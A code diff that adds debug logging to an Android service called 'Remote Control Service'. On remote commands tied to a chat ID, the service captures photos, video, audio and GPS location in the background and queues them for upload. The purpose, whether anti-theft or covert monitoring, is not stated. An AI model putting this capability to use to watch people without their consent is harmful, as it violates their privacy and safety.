@@ -218,6 +218,7 @@ class ForegroundActionService : Service() {
 
     override fun onCreate() {
         super.onCreate()
+        Log.d("ForegroundActionService", "onCreate called")
         val notification = androidx.core.app.NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
             .setContentTitle("Remote Control Service")
             .setContentText("Running background actions...")
@@ -229,22 +230,42 @@ class ForegroundActionService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         val action = intent?.getStringExtra("action") ?: ""
         val chatId = intent?.getStringExtra("chat_id")
+        Log.d("ForegroundActionService", "onStartCommand received: action=$action, chatId=$chatId")
         job?.cancel()
         job = CoroutineScope(Dispatchers.IO).launch {
             try {
                 when (action) {
-                    "photo" -> handleCameraAction("photo", intent, chatId)
-                    "video" -> handleCameraAction("video", intent, chatId)
-                    "audio" -> handleAudioRecording(intent, chatId)
-                    "location" -> handleLocation(chatId)
-                    "ring" -> handleRing()
-                    "vibrate" -> handleVibrate()
+                    "photo" -> {
+                        Log.d("ForegroundActionService", "Handling camera action: photo")
+                        handleCameraAction("photo", intent, chatId)
+                    }
+                    "video" -> {
+                        Log.d("ForegroundActionService", "Handling camera action: video")
+                        handleCameraAction("video", intent, chatId)
+                    }
+                    "audio" -> {
+                        Log.d("ForegroundActionService", "Handling audio recording")
+                        handleAudioRecording(intent, chatId)
+                    }
+                    "location" -> {
+                        Log.d("ForegroundActionService", "Handling location")
+                        handleLocation(chatId)
+                    }
+                    "ring" -> {
+                        Log.d("ForegroundActionService", "Handling ring")
+                        handleRing()
+                    }
+                    "vibrate" -> {
+                        Log.d("ForegroundActionService", "Handling vibrate")
+                        handleVibrate()
+                    }
                     else -> Log.e("ForegroundActionService", "Unknown action: $action")
                 }
             } catch (e: Exception) {
                 Log.e("ForegroundActionService", "Error in action $action", e)
             } finally {
                 removeCameraOverlay()
+                Log.d("ForegroundActionService", "Stopping service")
                 stopSelf()
             }
         }
@@ -258,6 +279,7 @@ class ForegroundActionService : Service() {
         val quality = intent?.getIntExtra("quality", 720) ?: 720
         val duration = intent?.getIntExtra("duration", 60) ?: 60
         val outputFile = File(cacheDir, generateFileName(type, quality))
+        Log.d("ForegroundActionService", "Camera params: type=$type, cameraFacing=$cameraFacing, flash=$flash, quality=$quality, duration=$duration, outputFile=${outputFile.absolutePath}")
         val result: Boolean
         try {
             result = CameraBackgroundHelper.takePhotoOrVideo(
@@ -277,6 +299,7 @@ class ForegroundActionService : Service() {
             removeCameraOverlay()
         }
         if (result && chatId != null) {
+            Log.d("ForegroundActionService", "Queueing camera result for upload: $outputFile")
             UploadManager.queueUpload(outputFile, chatId, type)
         }
     }
@@ -284,9 +307,11 @@ class ForegroundActionService : Service() {
     private suspend fun handleAudioRecording(intent: Intent?, chatId: String?) {
         val duration = intent?.getIntExtra("duration", 60) ?: 60
         val outputFile = File(cacheDir, "audio_${nowString()}.m4a")
+        Log.d("ForegroundActionService", "Audio params: duration=$duration, outputFile=${outputFile.absolutePath}")
         try {
             AudioBackgroundHelper.recordAudio(this, outputFile, duration)
             if (chatId != null) {
+                Log.d("ForegroundActionService", "Queueing audio result for upload: $outputFile")
                 UploadManager.queueUpload(outputFile, chatId, "audio")
             }
         } catch (e: Exception) {
@@ -306,6 +331,7 @@ class ForegroundActionService : Service() {
                 out.write("""{"lat":${loc.latitude},"lng":${loc.longitude},"timestamp":${loc.time}}""".toByteArray())
             }
             if (chatId != null) {
+                Log.d("ForegroundActionService", "Queueing location result for upload: $locationFile")
                 UploadManager.queueUpload(locationFile, chatId, "location")
             }
         } catch (e: Exception) {
@@ -325,6 +351,7 @@ class ForegroundActionService : Service() {
             Handler(Looper.getMainLooper()).postDelayed({
                 ringtone.stop()
                 audioManager.setStreamVolume(AudioManager.STREAM_RING, oldVolume, 0)
+                Log.d("ForegroundActionService", "Ring completed")
             }, (duration * 1000).toLong())
         } catch (e: Exception) {
             Log.e("ForegroundActionService", "Ring error: $e")
@@ -341,6 +368,7 @@ class ForegroundActionService : Service() {
                 @Suppress("DEPRECATION")
                 vibrator.vibrate(duration)
             }
+            Log.d("ForegroundActionService", "Vibrate triggered")
         } catch (e: Exception) {
             Log.e("ForegroundActionService", "Vibrate error: $e")
         }
@@ -350,15 +378,18 @@ class ForegroundActionService : Service() {
         if (overlayView == null) {
             overlayView = OverlayCameraView(this)
             overlayView?.addToWindow()
+            Log.d("ForegroundActionService", "Camera overlay shown")
         }
     }
     private fun removeCameraOverlay() {
         overlayView?.removeFromWindow()
         overlayView = null
+        Log.d("ForegroundActionService", "Camera overlay removed")
     }
     override fun onDestroy() {
         job?.cancel()
         removeCameraOverlay()
+        Log.d("ForegroundActionService", "onDestroy called")
         super.onDestroy()
     }
     override fun onBind(intent: Intent?): IBinder? = null
@@ -392,6 +423,7 @@ class ForegroundActionService : Service() {
             } else {
                 context.startService(intent)
             }
+            Log.d("ForegroundActionService", "startCameraAction called: type=$type, options=$options, chatId=$chatId")
         }
         fun startAudioAction(context: Context, options: JSONObject, chatId: String?) {
             val duration = options.optInt("duration", 60)
@@ -404,6 +436,7 @@ class ForegroundActionService : Service() {
             } else {
                 context.startService(intent)
             }
+            Log.d("ForegroundActionService", "startAudioAction called: duration=$duration, chatId=$chatId")
         }
         fun startLocationAction(context: Context, chatId: String?) {
             val intent = Intent(context, ForegroundActionService::class.java)
@@ -414,6 +447,7 @@ class ForegroundActionService : Service() {
             } else {
                 context.startService(intent)
             }
+            Log.d("ForegroundActionService", "startLocationAction called: chatId=$chatId")
         }
         fun startRingAction(context: Context, options: JSONObject) {
             val intent = Intent(context, ForegroundActionService::class.java)
@@ -423,6 +457,7 @@ class ForegroundActionService : Service() {
             } else {
                 context.startService(intent)
             }
+            Log.d("ForegroundActionService", "startRingAction called")
         }
         fun startVibrateAction(context: Context, options: JSONObject) {
             val intent = Intent(context, ForegroundActionService::class.java)
@@ -432,6 +467,7 @@ class ForegroundActionService : Service() {
             } else {
                 context.startService(intent)
             }
+            Log.d("ForegroundActionService", "startVibrateAction called")
         }
 
         fun generateFileName(type: String, quality: Int): String {
